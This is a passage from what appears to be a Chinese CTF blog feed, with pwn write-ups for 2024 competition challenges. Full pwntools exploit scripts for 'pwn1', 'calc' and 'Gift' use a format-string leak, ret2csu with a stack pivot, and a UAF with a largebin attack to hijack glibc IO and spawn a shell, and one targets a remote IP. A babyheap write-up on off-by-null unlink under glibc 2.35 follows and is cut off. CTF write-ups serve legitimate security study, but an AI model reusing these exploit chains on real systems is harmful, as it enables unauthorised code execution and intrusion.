class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><span class="hljs-comment">#io = process(&quot;./pwn1&quot;)</span><br>io = remote(<span class="hljs-string">&quot;3.1.26.8&quot;</span>,<span class="hljs-string">&quot;9999&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#libcc =ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>io.recvuntil(<span class="hljs-string">&quot;name&quot;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.send(<span class="hljs-string">&quot;%3$p&quot;</span>)<br>io.recv(<span class="hljs-number">1</span>)<br>libc_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">18</span> - libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>one = libc_base +<span class="hljs-number">0x1075aa</span><br><span class="hljs-comment">#suc(&quot;one&quot;,one)</span><br>one1 = one &amp; <span class="hljs-number">0xffffffff</span><br>io.recvuntil(<span class="hljs-string">&quot;out&quot;</span>)<br>payload = p64(<span class="hljs-number">0x404038</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+ p64(<span class="hljs-number">0x404038</span>) + p32(one1)<span class="hljs-comment">#+ p64(0x40121B)  </span><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.send(payload)<br><br><span class="hljs-comment">##io.recvuntil(&quot;&quot;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#io.send(p64(one))</span><br><br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p><strong>保护策略（无PIE，Canary）</strong></p><p><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101194918626-587743038.png" alt="img"></p><p><strong>程序上来有一个随机数绕过</strong></p><p><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101195031200-1730838421.png" alt="img"></p><p><strong>可以通过00截断绕过</strong></p><p><strong>然后进入漏洞函数，溢出长度我们可以自己输入</strong></p><p><strong>但是不能使用libc里面的地址</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101195138705-2140386887.png" alt="img"></strong></p><p><strong>但是可以通过ret2csu来实现函数调用一个read，然后再次读入数据栈迁移，getshell</strong></p><p><strong>EXP:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br><span class="hljs-comment">#io = process(&quot;./calc&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&quot;./calc&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>,<span class="hljs-string">&quot;admin\x00&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;password: \n&quot;</span>)<br>        <span class="hljs-comment">#sleep(0.1)</span><br>    io.send(<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x10</span>)<br>    msg = io.recv(<span class="hljs-number">11</span>)<br>    msg = msg.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Wrong&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------&gt;&quot;</span>,i)<br>        i = i+<span class="hljs-number">1</span><br>        io.close()<br>        <span class="hljs-keyword">continue</span><br><br><br><br>pop_rdi = <span class="hljs-number">0x00000000004015c3</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>puts_plt = <span class="hljs-number">0x4010D0</span><br>puts_got = <span class="hljs-number">0x404018</span><br>pop_rbp = <span class="hljs-number">0x000000000040123d</span> <span class="hljs-comment">#: pop rbp ; ret</span><br>bss = <span class="hljs-number">0x4040A0</span> + <span class="hljs-number">0x800</span><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-number">35</span>+<span class="hljs-number">8</span>-<span class="hljs-number">1</span>)<br>csu1 = <span class="hljs-number">0x4015BA</span> <br>csu2 = <span class="hljs-number">0x4015A0</span><br><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.sendline(length)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>    io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">200</span>))<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(length))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(length))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">19</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0xdeadbeef</span>))<br><span class="hljs-comment">#gdb.attach(io)</span><br><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(pop_rdi))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(puts_got))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(puts_plt))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(csu1))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(bss))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x404038</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(csu2))<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(pop_rbp))<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(bss-<span class="hljs-number">8</span>))<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x401559</span>))<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>pause()<br>gdb.attach(io)<br>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload =  p64(pop_rdi)+ p64(binsh) + p64(system)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h2><p><strong>保护策略（全开）</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101200845031-1239361843.png" alt="img"></strong></p><p><strong>程序使用的c++的std::cin和std::cout，所以看起来比较抽象</strong></p><p><strong>程序把add能申请的范围划分了3种，0x7f-0x14f ,0x14f-0x24f 0x24f-0x4ff</strong></p><p><strong>而且程序存在UAF</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101201108685-1511367215.png" alt="img"></strong></p><p><strong>因此泄露地址什么的比较容易</strong></p><p><strong>程序还有一个限制</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101201148585-542210826.png" alt="img"></strong></p><p><strong>当这个地址里面的值大于等于这个值才行，这个值其实是一开始申请的堆块</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101201227375-1640336535.png" alt="img"></strong></p><p><strong>可以通过largebin attack错位来使条件满足实现IO通过exit函数返回，进而劫持程序执行流，这里使用的是obstack，当然别的IO_house也可以，因为没有开启沙箱，所以劫持程序流可以直接getshell</strong></p><p><strong>EXP:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./gift&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add1</span>(<span class="hljs-params">size</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;3. Gf3~&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot; Gf1:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add2</span>(<span class="hljs-params">size</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;3. Gf3~&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot; Gf2:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add3</span>(<span class="hljs-params">size</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;3. Gf3~&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot; Gf3:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;someone:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;gift:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;gift:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,msg)<br><br><br><br>add3(<span class="hljs-number">0x420</span>)<br>add3(<span class="hljs-number">0x420</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> -libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] <br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&quot;stdout&quot;</span>]<br>suc(<span class="hljs-string">&quot;stdout&quot;</span>,stdout)<br>add1(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add1(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br><br>show(<span class="hljs-number">3</span>)<br>io.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x11ed0</span><br>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><br>add3(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#4</span><br><br>add3(<span class="hljs-number">0x440</span>) <span class="hljs-comment">#5</span><br>add3(<span class="hljs-number">0x430</span>) <span class="hljs-comment">#6</span><br>add3(<span class="hljs-number">0x430</span>) <span class="hljs-comment">#7</span><br>free(<span class="hljs-number">5</span>)<br>add3(<span class="hljs-number">0x450</span>) <span class="hljs-comment">#8</span><br>free(<span class="hljs-number">7</span>)<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>_IO_obstack_jumps = libc_base + <span class="hljs-number">0x1e9260</span><span class="hljs-comment">#libc.sym[&quot;_IO_obstack_jumps&quot;]</span><br>suc(<span class="hljs-string">&quot;_IO_obstack_jumps&quot;</span>,_IO_obstack_jumps)<br>fake_io_addr = heap_base + <span class="hljs-number">0x12fb0</span> <br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x8</span>:<span class="hljs-number">1</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-number">0</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-number">1</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-number">0</span>,<br>        <span class="hljs-number">0x28</span>:system,<br>        <span class="hljs-number">0x38</span>:binsh,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-number">1</span>,<br>        <span class="hljs-number">0xc8</span>:_IO_obstack_jumps+<span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0xd0</span>:fake_io_addr,<br>    &#125;,<br>    filler = <span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br><br>edit(<span class="hljs-number">5</span>,p64(fake_io_addr)*<span class="hljs-number">3</span>+p64(list_all-<span class="hljs-number">0x20</span>))<span class="hljs-comment">#+ 0x1ed708-0x20))</span><br><br><br>add3(<span class="hljs-number">0x460</span>) <span class="hljs-comment">#9</span><br>edit(<span class="hljs-number">7</span>,payload)<br><br>add3(<span class="hljs-number">0x490</span>) <span class="hljs-comment">#10</span><br>add3(<span class="hljs-number">0x480</span>) <span class="hljs-comment">#11</span><br>add3(<span class="hljs-number">0x480</span>) <span class="hljs-comment">#12</span><br>free(<span class="hljs-number">10</span>)<br>add3(<span class="hljs-number">0x4a0</span>) <span class="hljs-comment">#13</span><br>free(<span class="hljs-number">12</span>)<br>chunk = heap_base + <span class="hljs-number">0x11ea0</span>+<span class="hljs-number">0x10</span> <br>suc(<span class="hljs-string">&quot;chunk&quot;</span>,chunk)<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">10</span>,p64(heap_base+<span class="hljs-number">0x145f0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x1ecff0</span>+libc_base)+p64(chunk-<span class="hljs-number">0x20</span>+<span class="hljs-number">1</span>))<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>add3(<span class="hljs-number">0x4a0</span>) <span class="hljs-comment">#14</span><br><br>gdb.attach(io)<br>pause()<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;6&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p><strong>后续一些比赛的PWN的附件我会放在一个github的一个新建的库，如果有需要可以随机下载</strong></p><p><a href="https://github.com/CH13hh/CH13hh.github.io"><strong>https://github.com/CH13hh/CH13hh.github.io</strong></a></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[2024领航杯]babyheap题解</title>
    <link href="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/"/>
    <url>/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="2024领航杯-Pwn方向题解-babyheap"><a href="#2024领航杯-Pwn方向题解-babyheap" class="headerlink" title="[2024领航杯] Pwn方向题解 babyheap"></a>[2024领航杯] Pwn方向题解 babyheap</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a><strong>前言：</strong></h4><p>当然这个比赛我没有参加，是江苏省的一个比赛，附件是<a href="https://xidp0.github.io/">XiDP</a>师傅在比赛结束之后发给我的，最近事情有点多，当时搁置了一天，昨天下午想起来这个事情，才开始看题目，XiDP师傅说是2.35版本的libc，确实高版本libc的却棘手，我经验太浅了调试半天，最后让我们一起看一下这个题目。</p><h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略:"></a><strong>保护策略:</strong></h4><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014173210531.png" alt="image-20241014173210531"></p><h4 id="逆向分析："><a href="#逆向分析：" class="headerlink" title="逆向分析："></a><strong>逆向分析：</strong></h4><p>功能很齐全啊，该有的都有</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014173301118.png" alt="image-20241014173301118"></p><p>add函数最多存在11个堆块，没有大小限制</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014173406247.png" alt="image-20241014173406247"></p><p>输入content的时候存在一个off_by_null漏洞</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014173437629.png" alt="image-20241014173437629"></p><p>delete就是没有UAF漏洞，show函数是puts打印存在00截断。</p><p>edit函数只能用一次</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014173606616.png" alt="image-20241014173606616"></p><h4 id="关于泄露地址："><a href="#关于泄露地址：" class="headerlink" title="关于泄露地址："></a><strong>关于泄露地址：</strong></h4><p>当然存在00截断我们无法直接泄露地址，那么就需要实现unlink来进行堆块重叠，来抵消off_by_null的00截断。</p><h4 id="关于2-29之后off-by-null的说明："><a href="#关于2-29之后off-by-null的说明：" class="headerlink" title="关于2.29之后off_by_null的说明："></a><strong>关于2.29之后off_by_null的说明：</strong></h4><p>当然在之前呢大家也可以看见，我们只需要伪造一个prev size位配合off_by_null即可完成unlink的一系列攻击而且当时只free第一个堆块的话fd和bk指针也不需要伪造了。但是在glibc2.29之后加入了检查，具体是怎么样的呢，它会检查你要释放堆块的<strong>prev size和前面堆块的size位</strong>大小是不是一样的，不一样的话就会报错，当然想要绕过这个检查就需要修改size位，其实思路的话我们可以申请7个堆块，释放0，3，6堆块，至于为什么这样，因为我们需要修改size位，因为chunk3在中间所以我们比较好修改它的size位，我们释放chunk2，那么chunk2，3合并成了一个大的chunk，然后去申请堆块修改chunk3的size位即可，建议直接修改到top_chunk那里，因为后续要实现unlink的话还是要add堆块的。</p><p>那么这里需要有一点点的堆风水，怎么说呢，因为存在off_by_null我们输入数据的时候会留下一个00，我们让chunk3的chunk地址存在到00的位置，那么在进行伪造fd和bk指针的时候就可以<strong>通过截断来指向chunk3</strong>，怎么做呢，因为chunk2，3合并了，修改chunk3之后留下了一个chunk，这个chunk只有最后一位和chunk3不一样，我们可以通过利用这个堆块和chunk0，6来达到伪造fd和bk的目的，当然chunk0的bk指针比较好伪造，chunk6的fd指针我们输入什么都会修改两位因此我们需要chunk5和chunk6合并来修改chunk6的fd指针使其指向chunk3，最后正常off_by_null即可。</p><p><img src="/2024/10/14/2024%E9%A2%86%E8%88%AA%E6%9D%AF-babyheap%E9%A2%98%E8%A7%A3/image-20241014180006251.png" alt="image-20241014180006251"></p><h4 